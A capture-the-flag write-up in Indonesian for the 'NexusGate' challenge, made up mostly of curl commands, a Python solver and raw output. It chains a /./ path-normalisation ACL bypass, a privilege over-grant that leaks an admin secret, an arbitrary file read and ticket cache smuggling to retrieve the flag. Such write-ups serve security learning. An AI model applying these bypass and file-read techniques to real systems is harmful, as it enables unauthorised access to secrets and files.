# NexusGate — Eksploitasi / Solver

[← Overview](50-nexusgate.md) · [Index](index.md)

### 3.1 Strategi

- Gunakan `requests` lalu set `PreparedRequest.url` mentah agar `/./` tidak dinormalisasi.
- Lakukan cursor over-grant dan baca journal.
- Baca nonce bot dari `/app/data/bot` (permission tree).
- Ambil cached ticket dan tukar dengan flag.

### 3.2 Langkah exploit (live)

```bash
BASE=http://s1.nfx.my.id:49535
# 1. register
curl -sS -c cj -X POST -d 'username=ng123456&password=pw' "$BASE/register"

# 2. ACL bypass + cursor owner=admin
curl -sS --path-as-is -b cj -X POST \
  "$BASE/./internal/console/cursor?id=c1&owner=admin"
# {"ok":true}

# 3. tarik row dan tulis secret ke journal user
curl -sS --path-as-is -b cj \
  "$BASE/./internal/console/cursor?id=c1&journal=ng123456"
# {"done":false,"owner":"admin"}

# 4. baca journal
curl -sS -b cj -H 'Accept: application/json' "$BASE/audit"
# {"username":"ng123456","journal":["user account created",
#   "vault row: owner=admin secret=391ed5122926c01beeaa3d682662552c"]}
```

File read:

```bash
TOKEN=391ed5122926c01beeaa3d682662552c
curl -sS --path-as-is -b cj -X POST \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOKEN\",\"path\":\"/app/data/bot\",\"journal\":\"ng123456\"}" \
  "$BASE/./internal/console/files"
# {"ok":true}
curl -sS -b cj -H 'Accept: application/json' "$BASE/audit"
# "... file read: /app/data/bot -> e9757ee5ae6ea931"
```

Ticket:

```bash
NONCE=e9757ee5ae6ea931
curl -sS -H 'Accept: text/html,application/xhtml+xml' \
  "$BASE/tickets/latest?aud=$NONCE" > ticket.html
grep -o '<meta name="nx-ticket" content="[0-9a-f]*"' ticket.html
# <meta name="nx-ticket" content="7476476e7700172a2e0951debf0c2e9a"
```

Flag:

```bash
curl -sS -X POST -H 'Content-Type: application/json' \
  -d '{"ticket":"7476476e7700172a2e0951debf0c2e9a"}' "$BASE/flag"
# {"flag":"NFX{n3xu5_g4t3_0v3r_gr4nt_c4ch3_smuggl3_2026}"}
```

Script lengkap ada di `assets/nexusgate/exploit_nexusgate.py`. Inti script:

```python
def call(method, raw_path, **kw):
    url = BASE + raw_path
    req = requests.Request(method, url, **kw)
    prepped = S.prepare_request(req)
    prepped.url = url       # keep /./ raw
    return S.send(prepped, allow_redirects=False)

call("POST", "/./internal/console/cursor?id=c1&owner=admin")
call("GET",  f"/./internal/console/cursor?id=c1&journal={USER}")
token = re.search(r"secret=([0-9a-f]{32})",
                  S.get(BASE + "/audit", headers={"Accept": "application/json"}).text).group(1)

call("POST", "/./internal/console/files",
     data=json.dumps({"token": token, "path": "/app/data/bot", "journal": USER}),
     headers={"Content-Type": "application/json"})
nonce = re.findall(r"file read: /app/data/bot -> ([0-9a-f]{16})",
                   S.get(BASE + "/audit", headers={"Accept": "application/json"}).text)[-1]

html = requests.get(BASE + f"/tickets/latest?aud={nonce}",
                    headers={"Accept": "text/html"}).text
ticket = re.search(r'<meta name="nx-ticket" content="([0-9a-f]{32})">', html).group(1)
flag = requests.post(BASE + "/flag", json={"ticket": ticket}).json()["flag"]
```

### 3.3 Output asli

```text
===== register =====
POST http://s1.nfx.my.id:49535/register
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true,"session":"612772f0974d8c06"}

===== POST /./internal/console/cursor?owner=admin =====
POST http://s1.nfx.my.id:49535/./internal/console/cursor?id=c1&owner=admin
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true}

===== GET /./internal/console/cursor?journal=ng100557 =====
GET http://s1.nfx.my.id:49535/./internal/console/cursor?id=c1&journal=ng100557
HTTP 200  content-type=application/json; charset=utf-8
{"done":false,"owner":"admin"}

===== GET /audit (json) =====
HTTP 200  content-type=application/json; charset=utf-8
{"username":"ng100557","journal":["user account created","vault row: owner=admin secret=391ed5122926c01beeaa3d682662552c"]}

[+] PHASE_TOKEN = 391ed5122926c01beeaa3d682662552c

===== POST /./internal/console/files (attempt 1) =====
HTTP 200  content-type=application/json; charset=utf-8
{"ok":true}

[+] bot nonce = e9757ee5ae6ea931

===== GET /tickets/latest?aud=e9757ee5ae6ea931 =====
HTTP 200  content-type=text/html; charset=utf-8
<!DOCTYPE html> ... (halaman admin Service Tickets)

[+] MASTER_TICKET = 7476476e7700172a2e0951debf0c2e9a

===== POST /flag =====
HTTP 200  content-type=application/json; charset=utf-8
{"flag":"NFX{n3xu5_g4t3_0v3r_gr4nt_c4ch3_smuggl3_2026}"}

FLAG=NFX{n3xu5_g4t3_0v3r_gr4nt_c4ch3_smuggl3_2026}
```
